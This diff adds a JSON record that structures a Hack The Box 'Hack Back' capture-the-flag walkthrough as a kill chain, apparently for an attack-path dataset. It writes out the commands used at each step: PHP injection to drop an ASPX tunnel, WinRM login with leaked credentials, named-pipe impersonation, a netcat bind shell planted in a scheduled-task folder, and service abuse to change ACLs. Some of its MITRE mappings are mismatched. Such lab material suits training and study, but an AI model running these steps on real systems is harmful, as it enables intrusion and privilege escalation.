@@ -1,0 +1,151 @@
+{
+  "id": "ap-0020",
+  "title": "RCE via PHP Injection -> Tunneling -> Impersonation -> ADS Abuse",
+  "summary": "Initial access via web application PHP code injection, leveraging ReGeorg tunneling to access internal WinRM, utilizing SeImpersonatePrivilege to gain C2 as the user 'Hacker' via a scheduled task, and finally abusing a service's file permissions in combination with Alternate Data Streams (ADS) to retrieve the Administrator flag.",
+  "attack_path_markdown": "### Step 1: Reconnaissance\nInitial scanning and enumeration identified open ports (80, 6666, 64831) and the operating system (Windows Server). Subdomain fuzzing revealed an administrative panel .\n### Step 2: Exploitation and Initial Access\nA ROT13-encoded secret path structure was decoded from a JavaScript file, leading to a vulnerable PHP resource that allowed file reading and writing. Credentials (`symple:proprio`) were leaked from an old configuration file. A ReGeorg tunnel was set up via a file upload, enabling access to the internal WinRM service on port 5985. \n### Step 3: Privilege Escalation (User context)\nExploiting the `SeImpersonatePrivilege` held by the initial user (`symple`) and an automated task that executes `.bat` files in a specific directory, the user `HACKER` was impersonated.\n### Step 4: Final Privilege Escalation (Administrator context)\nA service named `UserLogger` was abused to modify the Access Control List (ACL) of the root flag file, granting access to retrieve the flag, which was hidden using an Alternate Data Stream (ADS).",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Scanning the target to determine the operating system, open ports, web technologies, and hidden subdomains/paths.",
+      "actions": [
+        "Perform OS identification via TTL check (TTL 127/128 indicates Windows).",
+        "Scan all TCP ports for open services using a fast rate.",
+        "Identify web server technology using 'whatweb'.",
+        "Fuzz for web content using 'ffuf'.",
+        "Fuzz for subdomains using 'ffuf' with 'subdomains_top1million_5000.txt'.",
+        "Decode ROT13-encoded configuration data found in a JavaScript file.",
+        "**Commands:** `nmap -sS -p- --min-rate 5000 10.10.10.128`, `whatweb http://10.10.10.128`, `ffuf -w <SUBDOMAIN_DICT>:FUZZ -H 'Host: FUZZ.hackback.htb' -u http://10.10.10.128`."
+      ],
+      "tools": ["nmap", "ffuf", "whatweb", "curl", "ROT13 decoder"],
+      "techniques": ["OS Fingerprinting", "Port Scanning", "Subdomain Enumeration", "Content Discovery"],
+      "mitre_ids": ["T1046", "T1589"],
+      "indicators": ["Open ports 80, 6666, 64831", "Subdomain admin.hackback.htb found", "Secret parameters (action, site, password) discovered"],
+      "preconditions": "Network access to the target IP address.",
+      "expected_outcome": "Discovery of services and vulnerable paths/parameters.",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Preparation of custom scripts and tools needed for pivoting and privilege escalation.",
+      "actions": [
+        "Acquire the ReGeorg SOCKS proxy script and the corresponding ASPX payload (`pwned.aspx`).",
+        "Obtain Windows binary for Netcat (`nc.exe`).",
+        "Prepare the PowerShell script for SeImpersonate privilege abuse (`impersonate.ps1`).",
+        "Create a malicious batch script (`savitar.bat`) to establish a persistent listener."
+      ],
+      "tools": ["ReGeorg", "nc.exe", "impersonate.ps1"],
+      "techniques": ["Inhibit Response Functions", "Develop Capabilities (Reverse Shell)", "Acquire Infrastructure"],
+      "mitre_ids": ["T1588.002", "T1588.003"],
+      "indicators": ["Creation of required payloads (.aspx, .ps1, .exe)."],
+      "preconditions": "Vulnerability discovered (file upload capability).",
+      "expected_outcome": "Prepared payloads for exploitation phase.",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Transmitting the ReGeorg payload to the target web server using the discovered PHP injection capability.",
+      "actions": [
+        "Upload the `pwned.aspx` payload to the web server via the RCE path.",
+        "**Commands:** `php echo file_put_contents('pwned.aspx', base64_decode('<BASE64_PAYLOAD>'))` [22]. (This command is executed via the vulnerable web parameter.)"
+      ],
+      "tools": ["curl", "Base64 Encoder"],
+      "techniques": ["Web Parameters abuse (PHP Injection)", "Staging"],
+      "mitre_ids": ["T1567"],
+      "indicators": ["ASPX file presence on the target server."],
+      "preconditions": "Successful identification of file write capability.",
+      "expected_outcome": "ASPX file accessible via the web server.",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Gaining initial access and pivoting to reach internal services.",
+      "actions": [
+        "Fuzz the password parameter to find valid credentials (`12345678`).",
+        "Read `web.config.old` to discover WinRM credentials (`symple:proprio`).",
+        "Execute `netstat -ano` via the internal service (Port 6666) to discover internal open port 5985 (WinRM).",
+        "Start ReGeorg tunnel.",
+        "Connect to WinRM internally using `proxychains` and `evil-winrm`.",
+        "**Commands:** `curl <WEBADMIN_PATH>?action=show&site=HACKTHEBOX&password=12345678` [27], `python2 regeorg.py -u <ASPX_URL> -p 1234`, `proxychains evil-winrm -i 10.10.10.128 -u symple -p proprio`."
+      ],
+      "tools": ["ffuf", "ReGeorg", "proxychains", "evil-winrm"],
+      "techniques": ["Credential Access (Fuzzing)", "Protocol Tunneling (SOCKS Proxy)", "Remote Services (WinRM)"],
+      "mitre_ids": ["T1552", "T1090.003", "T1021.006"],
+      "indicators": ["Initial shell as user 'symple'."],
+      "preconditions": "Successful file upload and WinRM service running internally.",
+      "expected_outcome": "Gained shell as 'symple' (low privilege user).",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Leveraging existing privileges and automated processes to gain access as a higher-privileged user ('Hacker').",
+      "actions": [
+        "Confirm `SeImpersonatePrivilege` for user 'symple'.",
+        "Identify scheduled task execution in `C:\utils\scripts\pool`.",
+        "Modify the `clean.ini` file using the discovered write capability to point the log output to a named pipe (`\\.\pipe\dumypipe`).",
+        "Execute `impersonate.ps1` to listen for the pipe connection.",
+        "Capture the user executing the scheduled task (user 'HACKER').",
+        "**Commands:** `whoami /priv` [9], `echo lifetime=100 >> clean.ini`, `echo log_file=\\.\pipe\dumypipe >> clean.ini`, `.\impersonate.ps1`."
+      ],
+      "tools": ["impersonate.ps1"],
+      "techniques": ["Abuse Privilege Delegation (Impersonation)", "Scheduled Task Abuse", "Process Discovery"],
+      "mitre_ids": ["T1134.001", "T1053.005", "T1057"],
+      "indicators": ["Successful capture of user 'HACKER' via the named pipe."],
+      "preconditions": "Service is configured to write logs to a modifiable location, and the service user has SeImpersonatePrivilege.",
+      "expected_outcome": "Ability to execute commands as user 'HACKER'.",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Establish a stable command shell as the impersonated user ('Hacker') via the tunneling mechanism.",
+      "actions": [
+        "Upload `nc.exe` and `savitar.bat` to a writeable directory (`C:\Windows\System32\spool\drivers\color`).",
+        "Copy `nc.exe` and the batch script into the scheduled task execution directory (`C:\utils\scripts\pool`) as user 'Hacker'.",
+        "The batch script executes Netcat bound to a command shell, listening internally.",
+        "Connect to the internal Netcat listener (Port 4444) via the existing ReGeorg/Proxychains tunnel.",
+        "**Commands:** `upload nc.exe C:\Windows\System32\spool\drivers\color\nc.exe`, `echo nc.exe -L -p 4444 -e cmd.exe > C:\utils\scripts\pool\savitar.bat` [25], `proxychains nc 127.0.0.1 4444`."
+      ],
+      "tools": ["nc.exe", "proxychains"],
+      "techniques": ["Reverse Shell", "Application Layer Protocol", "Inhibit System Recovery (Firewall Bypass)"],
+      "mitre_ids": ["T1090.003", "T1564.001"],
+      "indicators": ["Stable command shell as user 'HACKER'."],
+      "preconditions": "Impersonation of user 'HACKER' achieved and ReGeorg tunnel active.",
+      "expected_outcome": "Shell access as user 'HACKER'.",
+      "confidence": 1.0
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Achieve final administrative privilege by abusing a service's file permissions and retrieving the root flag hidden in an Alternate Data Stream (ADS).",
+      "actions": [
+        "Enumerate services via the Port 6666 web interface to find `UserLogger`.",
+        "Abuse `UserLogger` service parameters to set permissive ACLs on the Administrator root flag file.",
+        "**Commands:** `sc stop UserLogger` [43], `sc start UserLogger C:\Users\Administrator\Desktop\root.txt:2` (File path provided as service argument).",
+        "Confirm ACL modification using `icacls`.",
+        "Retrieve the flag content hidden within the Alternate Data Stream named 'flag.txt'.",
+        "**Commands:** `more C:\Users\Administrator\Desktop\root.txt:flag.txt`."
+      ],
+      "tools": ["sc", "icacls", "more"],
+      "techniques": ["Service Abuse", "File Permissions Modification", "Alternate Data Streams"],
+      "mitre_ids": ["T1548.002", "T1548.003", "T1564.004"],
+      "indicators": ["Full access obtained to the Administrator desktop file.", "Root flag content retrieved."],
+      "preconditions": "Ability to stop/start the UserLogger service.",
+      "expected_outcome": "Administrator level access to the final flag.",
+      "confidence": 1.0
+    }
+  ],
+  "tactics": ["Reconnaissance", "Initial Access", "Execution", "Privilege Escalation", "Lateral Movement", "Defense Evasion", "Credential Access"],
+  "techniques": ["Subdomain Enumeration", "PHP Injection", "Protocol Tunneling", "Impersonation", "Service Abuse", "Alternate Data Streams"],
+  "mitre_ids": ["T1589", "T1059.006", "T1090.003", "T1134.001", "T1548.002", "T1564.004"],
+  "hosts": ["10.10.10.128"],
+  "privs_obtained": ["domain user (symple)", "domain user (hacker)", "administrator"],
+  "confidence": 0.95,
+  "source_file": "",
+  "notes": "Procedure followed in the resolution of the Hack Back Windows machine.",
+  "labels": ["attack_path", "windows", "iis", "regeorg", "privesc", "ads"]
+}
